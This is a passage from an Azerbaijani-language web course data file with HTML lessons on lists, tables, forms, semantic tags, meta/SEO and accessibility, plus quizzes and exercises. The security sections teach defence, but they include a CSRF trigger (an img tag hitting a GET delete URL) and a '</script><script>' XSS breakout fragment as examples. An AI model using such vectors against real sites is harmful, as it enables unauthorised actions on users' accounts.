  <dd>Proqramların bir-biri ilə danışma qaydası.</dd>
</dl>` },
          { t: "list", items: [
            "Alt siyahı li-nin İÇİNDƏ yerləşir, iki li arasında yox.",
            "start — hansı nömrədən başlasın; reversed — geriyə saysın; type — 1, A, a, I, i.",
            "dl — description list: termin (dt) və onun izahı (dd). Lüğət, FAQ, məhsul xüsusiyyətləri üçün.",
          ]},
          { t: "mistake", lang: "html", wrong: `<ul>\n  <li>HTML</li>\n  <ul><li>Teqlər</li></ul>\n</ul>`, right: `<ul>\n  <li>HTML\n    <ul><li>Teqlər</li></ul>\n  </li>\n</ul>`, why: "ul-un uşağı yalnız li ola bilər; alt siyahı valideyn li-nin içində olmalıdır." },
        ],
      },
      {
        level: "senior",
        title: "Naviqasiya və əlçatanlıq",
        blocks: [
          { t: "code", lang: "html", code: `<nav aria-label="Əsas menyu">
  <ul>
    <li><a href="/">Ana səhifə</a></li>
    <li><a href="/dersler">Dərslər</a></li>
  </ul>
</nav>` },
          { t: "p", text: "Menyunu siyahı kimi yazanda ekran oxuyucu «siyahı, 2 element» deyir — istifadəçi nə qədər link olduğunu əvvəlcədən bilir. Safari-də CSS ilə list-style: none verəndə siyahı semantikası itə bilər; lazım olsa role=\"list\" əlavə edilir." },
          { t: "list", items: [
            "Sıra məna daşıyırsa ol, daşımırsa ul — bu seçim məna barədədir, görünüş yox.",
            "Nömrəni CSS counter() ilə özün dizayn edə bilərsən; ol semantikası qalır.",
            "Böyük siyahılarda (1000+ element) virtualizasiya düşün — DOM node sayı performansı öldürür.",
          ]},
          { t: "qa", items: [
            ["dl nə vaxt işlədilir?", "Ad–dəyər cütlərində: termin və izah, xüsusiyyət və dəyər."],
            ["Menyunu niyə ul içində yazırıq?", "Struktur və element sayı köməkçi texnologiyalara çatır."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Resept addımları üçün hansı siyahı?", options: ["ul", "ol", "dl"], answer: 1, why: "Addımların sırası vacibdir." },
        ],
      },
    ],
    exercise: {
      task: "Sevdiyin 3 filmin ul siyahısı, çay dəmləməyin ol addımları və 2 terminli dl lüğəti yaz. Bir film li-sinin içinə aktyorların alt siyahısını qoy.",
      starter: `<!-- Siyahılar -->\n`,
      expect: "ul və ol-un birbaşa uşaqları li; alt siyahı li-nin içindədir; dl-də dt/dd cütləri var.",
    },
  },
  {
    slug: "cedveller",
    title: "Cədvəllər",
    intro: "Cədvəl (table) sətir və sütunlu məlumat üçündür: qiymətlər, cədvəl qrafiki, statistika. Səhifə düzülüşü üçün YOX.",
    sections: [
      {
        level: "baslangic",
        title: "table, tr, th, td",
        blocks: [
          { t: "analogy", text: "Cədvəl — Excel vərəqidir. tr — bir sətir, td — bir xana, th — yuxarıdakı qalın başlıq xanası." },
          { t: "code", lang: "html", code: `<table>
  <caption>Tələbə qiymətləri</caption>
  <thead>
    <tr>
      <th scope="col">Ad</th>
      <th scope="col">Bal</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Aysel</td>
      <td>95</td>
    </tr>
    <tr>
      <td>Murad</td>
      <td>88</td>
    </tr>
  </tbody>
</table>` },
          { t: "terms", items: [
            ["<table>", "cədvəlin özü."],
            ["<tr>", "table row — sətir."],
            ["<td>", "table data — adi xana."],
            ["<th>", "table header — başlıq xanası."],
            ["<caption>", "cədvəlin adı."],
            ["<thead> / <tbody> / <tfoot>", "başlıq, gövdə və yekun hissələri."],
          ]},
        ],
      },
      {
        level: "orta",
        title: "Xanaları birləşdirmək",
        blocks: [
          { t: "code", lang: "html", code: `<tr>
  <th scope="row">Bazar ertəsi</th>
  <td colspan="2">Bayram — dərs yoxdur</td>
</tr>
<tr>
  <td rowspan="2">Riyaziyyat</td>
  <td>09:00</td>
</tr>
<tr>
  <td>11:00</td>
</tr>` },
          { t: "list", items: [
            "colspan=\"2\" — xana 2 sütun en tutur.",
            "rowspan=\"2\" — xana 2 sətir hündürlük tutur; növbəti sətirdə o sütun üçün td yazılmır.",
            "scope=\"col\" / \"row\" — başlığın sütuna, yoxsa sətrə aid olduğunu deyir.",
          ]},
          { t: "mistake", lang: "html", wrong: `<table>\n  <tr><td>Menyu</td><td>Məzmun</td></tr>\n</table>`, right: `<div class="layout">\n  <nav>Menyu</nav>\n  <main>Məzmun</main>\n</div>`, why: "Səhifə düzülüşü üçün cədvəl 2000-ci illərin üsuludur. İndi CSS Grid/Flexbox işlədilir; cədvəl yalnız cədvəl məlumatı üçün." },
          { t: "tip", text: "Xanalar arasında xətt üçün köhnə border atributunu yox, CSS-də border-collapse: collapse işlət." },
        ],
      },
      {
        level: "senior",
        title: "Böyük cədvəllər və a11y",
        blocks: [
          { t: "list", items: [
            "Ekran oxuyucu hər xananı oxuyanda onun th başlığını da deyir — buna görə th və scope vacibdir.",
            "Mürəkkəb cədvəldə th-lərə id ver, td-də headers=\"id1 id2\" ilə bağla.",
            "Mobil ekranda cədvəli overflow-x: auto olan konteynerə qoy — sətirləri qırma.",
            "table-layout: fixed — brauzer bütün məzmunu oxumadan sütun enini hesablayır, böyük cədvəllər sürətli render olunur.",
            "Minlərlə sətir: səhifələmə (pagination) və ya virtualizasiya; sıralama/filtr server tərəfdə.",
          ]},
          { t: "qa", items: [
            ["thead niyə lazımdır?", "Struktur verir; çap zamanı hər səhifədə təkrarlanır, sticky başlıq üçün də rahatdır."],
            ["rowspan-lı cədvəldə ən çox hansı səhv olur?", "Növbəti sətirdə artıq td yazılır və sütunlar sürüşür."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Bir xananın 3 sütun tutması üçün?", options: ["rowspan=\"3\"", "colspan=\"3\"", "width=\"3\""], answer: 1, why: "col — sütun, row — sətir." },
        ],
      },
    ],
    exercise: {
      task: "Həftəlik dərs cədvəli: caption, thead-də 3 sütun başlığı (Gün, Fənn, Saat), tbody-də 3 sətir. Bir xanada colspan işlət.",
      starter: `<table>\n\n</table>\n`,
      expect: "caption, thead (th scope=col), tbody (tr/td) var; colspan düzgün işlədilib, sütun sayı hər sətirdə uyğundur.",
    },
  },
  {
    slug: "formalar",
    title: "Formalar və input-lar",
    intro: "Forma istifadəçidən məlumat almağın yoludur: qeydiyyat, axtarış, sifariş. HTML özü çox şeyi pulsuz verir.",
    sections: [
      {
        level: "baslangic",
        title: "form, label, input, button",
        blocks: [
          { t: "analogy", text: "Forma — poçt blankıdır. label — xananın yanındakı yazı («Ad:»), input — yazdığın boş xana, name — o xananın kompüter üçün adı, button — blankı poçt qutusuna atmaq." },
          { t: "code", lang: "html", code: `<form action="/qeydiyyat" method="post">
  <label for="ad">Ad</label>
  <input id="ad" name="ad" type="text" required>

  <label for="email">Email</label>
  <input id="email" name="email" type="email" required>

  <label for="parol">Parol</label>
  <input id="parol" name="parol" type="password" minlength="8">

  <button type="submit">Qeydiyyatdan keç</button>
</form>` },
          { t: "terms", items: [
            ["action", "məlumatın göndəriləcəyi ünvan."],
            ["method", "get — URL-də (axtarış), post — gövdədə (qeydiyyat, parol)."],
            ["<label for>", "yazı ilə input-u id vasitəsilə bağlayır; yazıya klik input-u seçir."],
            ["name", "serverə gedən açar: ad=Aysel."],
            ["type", "input növü: text, email, password, number, date, checkbox, radio, file..."],
            ["required", "boş göndərmək olmaz."],
          ]},
        ],
      },
      {
        level: "orta",
        title: "Digər idarəetmə elementləri",
        blocks: [
          { t: "code", lang: "html", code: `<fieldset>
  <legend>Səviyyə</legend>
  <label><input type="radio" name="seviyye" value="junior" checked> Junior</label>
  <label><input type="radio" name="seviyye" value="senior"> Senior</label>
</fieldset>

<label><input type="checkbox" name="xeber" value="he"> Xəbərlərə abunə ol</label>

<label for="dil">Dil</label>
<select id="dil" name="dil">
  <option value="js">JavaScript</option>
  <option value="py">Python</option>
</select>

<label for="mesaj">Mesaj</label>
<textarea id="mesaj" name="mesaj" rows="4"></textarea>` },
          { t: "list", items: [
            "radio — eyni name-li qrupdan yalnız biri seçilir. checkbox — istənilən sayda.",
            "fieldset + legend — əlaqəli xanaları qruplaşdırır və adlandırır.",
            "Mobil üçün düzgün type seç: type=\"email\" @ düyməli, type=\"tel\" rəqəmli klaviatura açır.",
            "autocomplete=\"email\", \"name\", \"new-password\" — brauzer avtomatik doldursun.",
          ]},
          { t: "mistake", lang: "html", wrong: `<input type="text" placeholder="Ad">`, right: `<label for="ad">Ad</label>\n<input id="ad" name="ad" type="text">`, why: "placeholder label əvəz etmir: yazmağa başlayanda yox olur, ekran oxuyucu üçün etibarlı deyil. name olmasa isə məlumat serverə ümumiyyətlə getmir." },
          { t: "mistake", lang: "html", wrong: `<form>\n  <button onclick="sil()">Sil</button>\n</form>`, right: `<form>\n  <button type="button" onclick="sil()">Sil</button>\n</form>`, why: "Form içində button-un default tipi submit-dir — klik formanı göndərib səhifəni yeniləyir." },
        ],
      },
      {
        level: "senior",
        title: "Formalar necə işləyir və təhlükəsizlik",
        blocks: [
          { t: "p", text: "Submit zamanı brauzer formanın bütün aktiv (disabled olmayan) name-li elementlərini toplayır, application/x-www-form-urlencoded (və ya fayl varsa multipart/form-data) formatında kodlayıb göndərir. JS-də new FormData(form) eyni məlumatı verir." },
          { t: "list", items: [
            "Client tərəf validasiyası rahatlıq üçündür, TƏHLÜKƏSİZLİK üçün deyil — serverdə həmişə yenidən yoxla.",
            "Parol və şəxsi məlumat heç vaxt GET ilə — URL loglarda və tarixçədə qalır.",
            "CSRF: POST formalarına token əlavə et və ya SameSite cookie işlət.",
            "disabled sahə göndərilmir, readonly göndərilir.",
            "Progressive enhancement: forma JS-siz də işləsin, JS onu yaxşılaşdırsın (Next.js server actions bu prinsiplə qurulub).",
          ]},
          { t: "qa", items: [
            ["GET və POST fərqi?", "GET məlumatı URL-də göndərir, idempotentdir, keşlənir. POST gövdədə göndərir, vəziyyəti dəyişən əməliyyatlar üçündür."],
            ["label-i input-a bağlamağın iki yolu?", "for=\"id\" ilə və ya input-u label-in içinə qoymaqla."],
          ]},
          { t: "h", text: "Forma təhlükəsizliyi: autocomplete, CSRF, metod" },
          { t: "code", lang: "html", code: `<form action="/giris" method="post" autocomplete="on">
  <input type="hidden" name="csrf_token" value="SERVER_TƏRƏFİNDƏN_VERİLƏN_TOKEN">

  <label>Email <input type="email" name="email" autocomplete="username" required></label>
  <label>Parol <input type="password" name="parol" autocomplete="current-password" required></label>

  <!-- Yeni parol: brauzer güclü parol təklif edə bilsin -->
  <input type="password" name="yeni" autocomplete="new-password" minlength="12">

  <!-- Birdəfəlik kod: parol meneceri doldurmasın -->
  <input type="text" name="otp" autocomplete="one-time-code" inputmode="numeric">

  <button type="submit">Daxil ol</button>
</form>` },
          { t: "list", items: [
            "Həssas məlumatı (parol, token) heç vaxt GET ilə göndərmə: URL brauzer tarixçəsində, server loglarında və Referer-də qalır. Dəyişiklik edən əməliyyatlar POST/PUT/DELETE olmalıdır.",
            "autocomplete=\"current-password\" / \"new-password\" / \"one-time-code\" parol menecerlərinə kömək edir və təhlükəsizdir. Parol menecerini bloklamaq (autocomplete=off) istifadəçini zəif parola itələyir.",
            "CSRF (Cross-Site Request Forgery): istifadəçi sənin saytında giriş edibsə, zərərli sayt onun adından gizli forma göndərə bilər, çünki brauzer cookie-ni avtomatik əlavə edir.",
            "CSRF müdafiəsi: server tərəfi anti-CSRF token (hidden input), cookie-də SameSite=Lax/Strict, və Origin/Referer başlığının yoxlanması. GET sorğusu heç vaxt vəziyyəti dəyişməməlidir.",
            "Fayl yükləyirsənsə: enctype=\"multipart/form-data\" və serverdə fayl tipi, ölçü, uzantı yoxlanması; accept atributu yalnız UX üçündür, təhlükəsizlik deyil.",
          ]},
          { t: "warn", text: "Hidden input, readonly, disabled, maxlength və required istifadəçi tərəfindən DevTools ilə dəyişdirilə bilər. Qiymət, rol, istifadəçi id-si kimi dəyərləri heç vaxt formadan «etibarlı» qəbul etmə — serverdə yenidən hesabla və yoxla." },
          { t: "mistake", lang: "html", wrong: `<form action="/hesab/sil?id=42" method="get">
  <button>Hesabı sil</button>
</form>`, right: `<form action="/hesab/sil" method="post">
  <input type="hidden" name="csrf_token" value="...">
  <button>Hesabı sil</button>
</form>`, why: "GET ilə silmə <img src=\"/hesab/sil?id=42\"> kimi sadə bir teqlə başqa saytdan tetiklənə bilər. Vəziyyəti dəyişən əməliyyat POST + CSRF token tələb etməlidir." },
          { t: "qa", items: [
            ["CSRF ilə XSS arasında fərq nədir?", "XSS — zərərli kod sənin səhifəndə icra olunur. CSRF — zərərli sayt istifadəçinin brauzerini sənin serverinə istənməyən sorğu göndərməyə məcbur edir. XSS CSRF tokenini də oğurlaya bilər."],
            ["SameSite cookie nə verir?", "SameSite=Lax/Strict cookie-nin üçüncü tərəf saytından gələn sorğularla göndərilməsini məhdudlaşdırır və CSRF-i xeyli azaldır; amma token ilə birlikdə dərin müdafiə (defense in depth) kimi işlət."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Input-un dəyəri serverə hansı atributun adı ilə gedir?", options: ["id", "name", "class"], answer: 1, why: "id label və CSS üçündür, server name-i görür." },
          { t: "quiz", q: "Bir-birini istisna edən seçimlər üçün?", options: ["checkbox", "radio", "select multiple"], answer: 1, why: "Eyni name-li radio-lardan yalnız biri seçilir." },
        ],
      },
    ],
    exercise: {
      task: "Əlaqə forması: ad (məcburi), email (type=email, məcburi), mövzu üçün select (3 seçim), mesaj üçün textarea və submit düyməsi. Hər sahənin label-i olsun.",
      starter: `<form action="/elaqe" method="post">\n\n</form>\n`,
      expect: "hər input/select/textarea-nın for-id ilə bağlı label-i və name-i var; email type=email; required ad və email-də; button type=submit.",
    },
  },
  {
    slug: "semantik",
    title: "Semantik HTML",
    intro: "Semantik teqlər məzmunun NƏ olduğunu deyir: header, nav, main, article, footer. Brauzer, Google və ekran oxuyucu səhifəni məhz onlarla anlayır.",
    sections: [
      {
        level: "baslangic",
        title: "Div-lərdən mənalı teqlərə",
        blocks: [
          { t: "analogy", text: "Hər otağın qapısına «otaq» yazsan, qonaq mətbəxi tapa bilməz. «Mətbəx», «yataq otağı», «hamam» yazsan, hər şey aydındır. div — «otaq», semantik teqlər — otağın əsl adı." },
          { t: "code", lang: "html", code: `<body>
  <header>
    <a href="/">Logo</a>
    <nav>...</nav>
  </header>

  <main>
    <article>
      <h1>Flexbox necə işləyir?</h1>
      <p>...</p>
      <section>
        <h2>Əsas oxlar</h2>
        <p>...</p>
      </section>
    </article>

    <aside>Oxşar məqalələr</aside>
  </main>

  <footer>© 2026 Kod Akademiyası</footer>
</body>` },
          { t: "terms", items: [
            ["<header>", "səhifənin və ya bölmənin başı: loqo, başlıq, menyu."],
            ["<nav>", "əsas naviqasiya linkləri."],
            ["<main>", "səhifənin əsas, unikal məzmunu. Səhifədə bir dənə."],
            ["<article>", "öz-özünə tam məzmun: məqalə, post, məhsul kartı."],
            ["<section>", "başlığı olan tematik bölmə."],
            ["<aside>", "əsas məzmuna yan aid olan şey: reklam, əlaqəli linklər."],
            ["<footer>", "son hissə: müəllif, hüquqlar, əlaqə."],
          ]},
        ],
      },
      {
        level: "orta",
        title: "Hansını seçim? Qayda",
        blocks: [
          { t: "list", items: [
            "Başqa saytda tək başına mənalı olarsa (RSS-də paylaşılsa) → article.",
            "Mövzuya görə qrupdursa və başlığı varsa → section.",
            "Sadəcə stil/düzülüş üçün qutu lazımdırsa → div (bu da normaldır!).",
            "Kliklənəndə əməliyyat edirsə → button, başqa yerə aparırsa → a.",
          ]},
          { t: "mistake", lang: "html", wrong: `<div class="header">\n  <div class="menu">...</div>\n</div>\n<div class="content">...</div>`, right: `<header>\n  <nav>...</nav>\n</header>\n<main>...</main>`, why: "«Div şorbası» işləyir, amma brauzer və ekran oxuyucu üçün heç bir məna yoxdur. Semantik teqlər pulsuz əlçatanlıq verir." },
          { t: "mistake", lang: "html", wrong: `<div class="btn" onclick="gonder()">Göndər</div>`, right: `<button type="button" onclick="gonder()">Göndər</button>`, why: "div Tab ilə fokuslanmır, Enter/Space ilə işləmir, ekran oxuyucu onu düymə kimi tanımır. button bunların hamısını hazır verir." },
        ],
      },
      {
        level: "senior",
        title: "Landmark-lar və əlçatanlıq ağacı",
        blocks: [
          { t: "p", text: "Brauzer DOM-dan paralel olaraq əlçatanlıq ağacı (accessibility tree) qurur. Semantik teqlər orada avtomatik rol (role) alır: header → banner, nav → navigation, main → main, footer → contentinfo, aside → complementary. Ekran oxuyucu istifadəçiləri bu «landmark»lar arasında bir düymə ilə tullanır." },
          { t: "list", items: [
            "ARIA-nın birinci qaydası: native HTML elementi varsa, ARIA yox, onu işlət. <div role=\"button\"> yerinə <button>.",
            "header/footer yalnız body-nin birbaşa uşağı olanda banner/contentinfo rolunu alır; article içində adi bölmədir.",
            "Bir neçə nav varsa aria-label ilə fərqləndir: \"Əsas menyu\", \"Səhifələmə\".",
            "Semantika SEO-ya birbaşa təsir etməsə də, Google məzmunu və snippet-ləri daha düzgün çıxarır.",
            "\"Əsas məzmuna keç\" (skip link) — klaviatura istifadəçisi menyunu hər dəfə keçməsin.",
          ]},
          { t: "qa", items: [
            ["section ilə div fərqi?", "section başlığı olan tematik bölmədir və strukturda görünür; div heç bir məna daşımır."],
            ["Semantik HTML-in 3 faydası?", "Əlçatanlıq, SEO/maşın oxunaqlılığı və kodun oxunaqlılığı (komanda üçün)."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Bloq yazısı üçün ən uyğun teq?", options: ["<section>", "<article>", "<aside>"], answer: 1, why: "Yazı öz-özünə tam məzmundur." },
          { t: "quiz", q: "Səhifədə neçə görünən <main> ola bilər?", options: ["1", "İstənilən qədər", "Hər section-da bir"], answer: 0, why: "main səhifənin unikal əsas məzmunudur." },
        ],
      },
    ],
    exercise: {
      task: "Bloq səhifəsinin skeleti: header (loqo + nav), main içində article (h1, 2 section h2 ilə), aside (oxşar yazılar siyahısı), footer.",
      starter: `<body>\n\n</body>\n`,
      expect: "header>nav, bir main, article içində h1 və h2-li section-lar, aside, footer var; div şorbası yoxdur; başlıq səviyyələri düzgündür.",
    },
  },
  {
    slug: "meta",
    title: "Meta teqlər və SEO",
    intro: "Meta teqlər səhifədə görünmür, amma brauzerə, Google-a və sosial şəbəkələrə səhifə haqqında məlumat verir. Axtarışda necə görünəcəyin onlardan asılıdır.",
    sections: [
      {
        level: "baslangic",
        title: "head içindəki vizit kartı",
        blocks: [
          { t: "analogy", text: "Kitabın üz qabığını düşün: adı, müəllifi, arxada qısa təsviri. Kitabı açmadan nə haqqında olduğunu bilirsən. Meta teqlər səhifənin üz qabığıdır — Google və Telegram səhifəni «açmadan» onları oxuyur." },
          { t: "code", lang: "html", code: `<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Flexbox dərsi — Kod Akademiyası</title>
  <meta name="description" content="Flexbox-u sadə nümunələrlə öyrən: oxlar, düzülüş, boşluqlar.">
</head>` },
          { t: "terms", items: [
            ["charset=\"utf-8\"", "simvol kodlaşdırması. Onsuz ə, ö, ş hərfləri pozula bilər. head-in ən əvvəlində olmalıdır."],
            ["viewport", "mobil ekranda səhifənin eni cihazın eninə bərabər olsun. Onsuz telefon səhifəni kiçildib göstərir."],
            ["<title>", "brauzer tabında və Google nəticəsində mavi başlıq. Hər səhifədə unikal olmalıdır."],
            ["description", "Google nəticəsində başlığın altındakı qısa mətn (snippet). ~150–160 simvol."],
          ]},
          { t: "tip", text: "Yaxşı title düsturu: «Səhifənin mövzusu — Saytın adı». 50–60 simvol kifayətdir, uzunu kəsilir." },
        ],
      },
      {
        level: "orta",
        title: "Sosial şəbəkə kartı və axtarış robotları",
        blocks: [
          { t: "p", text: "Linki Telegram, WhatsApp və ya LinkedIn-ə atanda şəkilli kart çıxır. Bunu Open Graph (og:) teqləri idarə edir. Onlar name yox, property atributu ilə yazılır." },
          { t: "code", lang: "html", code: `<meta property="og:title" content="Flexbox dərsi">
<meta property="og:description" content="Flexbox-u sadə nümunələrlə öyrən.">
<meta property="og:image" content="https://sayt.az/og/flexbox.png">
<meta property="og:url" content="https://sayt.az/css/flexbox">
<meta property="og:type" content="article">
<meta name="twitter:card" content="summary_large_image">

<link rel="canonical" href="https://sayt.az/css/flexbox">
<link rel="icon" href="/favicon.ico">
<meta name="robots" content="noindex, nofollow">`, caption: "Sonuncu sətir yalnız axtarışda görünməməli səhifələr üçündür" },
          { t: "terms", items: [
            ["og:image", "kartdakı şəkil. Tam (absolute) URL olmalıdır, tövsiyə ölçü 1200×630."],
            ["canonical", "eyni məzmun bir neçə ünvanda açılırsa (?sort=, ?utm=), «əsl ünvan budur» deyir. Dublikat problemi həll olur."],
            ["robots noindex", "bu səhifəni axtarış indeksinə salma (məs. səbət, admin, axtarış nəticəsi)."],
          ]},
          { t: "mistake", lang: "html", wrong: `<title>Ana səhifə</title>\n<!-- bütün səhifələrdə eyni title, description yoxdur -->`, right: `<title>Flexbox dərsi — Kod Akademiyası</title>\n<meta name="description" content="Flexbox-u nümunələrlə öyrən.">`, why: "Eyni title-lı səhifələri Google bir-birindən ayıra bilmir. description olmayanda snippet-i özü təsadüfi mətndən seçir." },
          { t: "mistake", lang: "html", wrong: `<meta name="viewport" content="width=device-width, user-scalable=no">`, right: `<meta name="viewport" content="width=device-width, initial-scale=1">`, why: "user-scalable=no böyütməni (zoom) bağlayır. Zəif görən insan mətni böyüdə bilmir — əlçatanlıq pozuntusudur." },
        ],
      },
      {
        level: "senior",
        title: "Google səhifəni necə oxuyur. Struktur məlumat və təhlükəsizlik",
        blocks: [
          { t: "p", text: "Axtarış sistemi üç addım atır: tarama (crawl) — linklərlə gəzir; indeksləmə (index) — məzmunu anlayıb bazaya yazır; sıralama (rank) — sorğuya görə düzür. Meta teqlər ikinci addıma kömək edir, amma sıralamanı əsasən məzmunun keyfiyyəti, sürət və linklər müəyyən edir. meta keywords teqini Google çoxdan nəzərə almır." },
          { t: "code", lang: "html", code: `<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Course",
  "name": "Flexbox dərsi",
  "description": "Flexbox-u sadə nümunələrlə öyrən.",
  "provider": { "@type": "Organization", "name": "Kod Akademiyası" }
}
</script>`, caption: "JSON-LD struktur məlumat: Google-da ulduz, qiymət, kurs kartı kimi zəngin nəticələr" },
          { t: "list", items: [
            "Məzmun JS ilə sonradan gəlirsə, robot onu gec görür və ya heç görmür. Vacib meta teqlər serverdə render olunmalıdır (SSR/SSG) — Next.js-də bunu metadata API edir.",
            "<html lang=\"az\"> dili bildirir; çoxdilli saytda <link rel=\"alternate\" hreflang=\"en\" href=\"...\"> ilə dil variantlarını göstər.",
            "TƏHLÜKƏSİZLİK: robots.txt və noindex gizlətmə vasitəsi DEYİL. robots.txt hamıya açıqdır — orada /admin yazmaq hücumçuya ünvanı göstərməkdir. Məxfi səhifəni giriş (auth) ilə qoru.",
            "TƏHLÜKƏSİZLİK: istifadəçi mətnini (məhsul adı, profil) title/og:title/JSON-LD-yə qoyanda escape et. Əks halda «</script><script>...» ilə XSS mümkündür. JSON-LD-də < simvolunu \\u003c ilə əvəz et.",
            "<meta name=\"referrer\" content=\"strict-origin-when-cross-origin\"> — başqa sayta keçəndə tam URL (içində token ola bilər) sızmasın.",
            "CSP-ni <meta http-equiv=\"Content-Security-Policy\"> ilə vermək olar, amma HTTP başlığı daha güclüdür: meta variantında frame-ancestors və report-uri işləmir.",
          ]},
          { t: "qa", items: [
            ["canonical nə üçündür?", "Eyni məzmunun bir neçə URL-i olanda əsas ünvanı göstərir ki, axtarış sistemi onları dublikat saymasın və «çəki» bir ünvanda toplansın."],
            ["noindex ilə robots.txt Disallow fərqi?", "Disallow taramanı qadağan edir, amma səhifə başqa linklərdən indeksə düşə bilər. noindex indeksdən çıxarır — bunun üçün robot səhifəni oxuya bilməlidir, yəni ikisini birlikdə işlətmək səhvdir."],
            ["SPA-da SEO problemi nədir?", "HTML boş gəlir, məzmun JS-dən sonra yaranır. Robot gec/natamam görür, sosial şəbəkə botları isə JS-i ümumiyyətlə icra etmir. Həll: SSR və ya statik generasiya."],
          ]},
          { t: "h", text: "CSP, Referrer-Policy və clickjacking" },
          { t: "p", text: "Content-Security-Policy (CSP) brauzerə səhifənin hansı mənbələrdən skript, stil, şəkil və s. yükləyə biləcəyini bildirir. Uğurlu XSS hücumunun təsirini kəskin azaldır. Ən güclü yol HTTP cavab başlığıdır; <meta http-equiv> ilə də verilə bilər, amma məhdudiyyətləri var." },
          { t: "code", lang: "html", code: `<head>
  <meta charset="utf-8">
  <!-- CSP meta ilə: yalnız öz mənbən və bir CDN -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self' https://cdn.example.com; img-src 'self' data:; object-src 'none'; base-uri 'self'">

  <!-- Referer sızmasını azalt -->
  <meta name="referrer" content="strict-origin-when-cross-origin">
</head>` },
          { t: "code", lang: "http", code: `# Başlıqla (üstün yol) — meta ilə mümkün olmayanlar da burada işləyir
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: DENY` },
          { t: "list", items: [
            "meta CSP-də frame-ancestors, report-uri və sandbox direktivləri İŞLƏMİR — clickjacking müdafiəsi yalnız HTTP başlığı ilə mümkündür.",
            "Clickjacking: hücumçu sənin səhifəni şəffaf iframe-də öz saytında göstərib istifadəçini gizli düymələrə kliklətir. Müdafiə: Content-Security-Policy: frame-ancestors 'none' (və ya 'self') + köhnə brauzerlər üçün X-Frame-Options: DENY.",
            "'unsafe-inline' və 'unsafe-eval' CSP-nin əsas faydasını silir. İnline skriptlər üçün nonce (hər sorğuda təsadüfi) və ya hash istifadə et.",
            "Yeni CSP-ni əvvəl Content-Security-Policy-Report-Only rejimində sına — pozuntuları bloklamadan hesabatla.",
            "X-Content-Type-Options: nosniff brauzerin faylın tipini «təxmin etməsinin» qarşısını alır (məs. yüklənmiş mətn faylının skript kimi icrası).",
          ]},
          { t: "tip", text: "CSP «yoxlama siyahısı» deyil, dərin müdafiə qatıdır. Əsas müdafiə yenə də çıxışın düzgün escape olunmasıdır; CSP isə xəta olduqda ziyanı məhdudlaşdırır." },
          { t: "qa", items: [
            ["CSP-ni nə üçün meta ilə deyil, başlıqla verirlər?", "Başlıq HTML parse olunmazdan əvvəl tətbiq olunur, bütün direktivləri dəstəkləyir (frame-ancestors, sandbox, report-uri) və meta teqi yerləşdiyi yerdən əvvəlki məzmuna təsir etmir."],
            ["Clickjacking-dən necə qorunmaq olar?", "frame-ancestors 'none' və ya 'self' CSP direktivi, ehtiyat kimi X-Frame-Options. Həssas əməliyyatlarda əlavə təsdiq (parol, 2FA) də faydalıdır."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Telegram-da link kartının şəklini hansı teq verir?", options: ["<meta name=\"description\">", "<meta property=\"og:image\">", "<link rel=\"icon\">"], answer: 1, why: "Sosial kartları Open Graph teqləri idarə edir." },
          { t: "quiz", q: "Mobil-də səhifə kiçik görünür. Çox güman nə çatmır?", options: ["meta viewport", "meta charset", "canonical"], answer: 0, why: "viewport olmayanda telefon səhifəni ~980 px enində çəkib kiçildir." },
          { t: "quiz", q: "Admin panelini gizlətməyin düzgün yolu?", options: ["robots.txt-də Disallow", "meta noindex", "Giriş (autentifikasiya) tələbi"], answer: 2, why: "robots.txt və noindex qoruma deyil — yalnız robotlara xahişdir." },
        ],
      },
    ],
    exercise: {
      task: "«Python kursu» səhifəsi üçün tam head yaz: charset, viewport, unikal title, description, 4 Open Graph teqi (title, description, image, url), canonical link. body-də h1 olsun.",
      starter: `<!DOCTYPE html>\n<html lang="az">\n<head>\n\n</head>\n<body>\n  <h1>Python kursu</h1>\n</body>\n</html>\n`,
      expect: "charset utf-8 head-in əvvəlində, viewport width=device-width (user-scalable=no YOX), mənalı title və description, og:title/og:description/og:image (absolute URL)/og:url property atributu ilə, link rel=canonical var.",
    },
  },
  {
    slug: "elcatanliq",
    title: "Əlçatanlıq (a11y) və ARIA",
    intro: "Əlçatanlıq (accessibility, qısaca a11y) — saytı hamının işlədə bilməsidir: görməyən, siçan tuta bilməyən, günəş altında telefona baxan insan da. Əsası düzgün HTML-dir.",
    sections: [
      {
        level: "baslangic",
        title: "Sayt hamı üçündür",
        blocks: [
          { t: "analogy", text: "Binanın girişində pilləkənlə yanaşı pandus da olur. Pandus təkcə əlil arabası üçün deyil — uşaq arabası, çamadan, velosiped üçün də rahatdır. Əlçatan sayt da belədir: hamıya xeyir edir." },
          { t: "p", text: "Görməyən istifadəçi ekran oxuyucu (screen reader) işlədir: proqram səhifəni səslə oxuyur. O, şəkli görmür — alt mətnini oxuyur. Rəngi görmür — teqin mənasını deyir: «düymə», «link», «başlıq, səviyyə 2»." },
          { t: "code", lang: "html", code: `<img src="pisik.jpg" alt="Pəncərədə oturan qara pişik">

<label for="email">E-poçt</label>
<input id="email" type="email">

<button type="button">Səbətə at</button>

<a href="/kurslar">Bütün kurslara bax</a>` },
          { t: "terms", items: [
            ["alt", "şəklin mətnlə təsviri. Şəkil yalnız bəzəkdirsə boş yaz: alt=\"\" — oxuyucu onu ötürəcək."],
            ["label for", "input-un adı. Oxuyucu «E-poçt, mətn sahəsi» deyir; label-ə klik input-u fokuslayır."],
            ["button / a", "hazır əlçatan elementlər: Tab ilə fokuslanır, Enter ilə işləyir."],
          ]},
